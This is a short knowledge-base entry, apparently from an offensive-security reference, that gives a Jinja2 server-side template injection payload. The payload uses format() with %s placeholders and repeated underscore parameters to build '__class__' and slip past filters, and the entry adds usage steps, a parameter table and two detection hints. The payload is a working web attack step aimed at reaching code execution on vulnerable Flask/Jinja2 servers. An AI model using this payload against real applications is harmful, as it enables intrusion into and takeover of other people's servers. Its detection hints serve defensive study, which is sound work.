---
id: d007345f-ffa8-4c49-b600-c7fe3cabb6c0
type: code
language: python
verified: true
created_at: '2023-04-06T03:56:39.901806+00:00'
updated_at: '2023-04-10T20:23:43.898447+00:00'
platforms:
  - Web
tags:
  - jinja2
  - ssti
  - filter-bypass
validated: true
---

# jinja2-bypass-using-format-method

## Code

```python
http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ 
```

## Description

Payload using string.format() with %s placeholders to build '__class__' from repeated '_' params, bypassing join or direct string filters.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $TARGET_URL | Vulnerable endpoint | http://localhost:5000/ |
| f | Format string param | %s%sclass%s%s |
| a | Underscore filler | _ |

## Usage

Send as GET with params; format inserts '_' into placeholders for '__class__'. Alternative when join is unavailable.

## Detection

- Params like f=%s%sclass%s%s&a=_ .
- Template logs with format() on request.args.

## Related

- [[procedures/Bypass-Jinja2-Filters-for-SSTI-Code-Execution]]
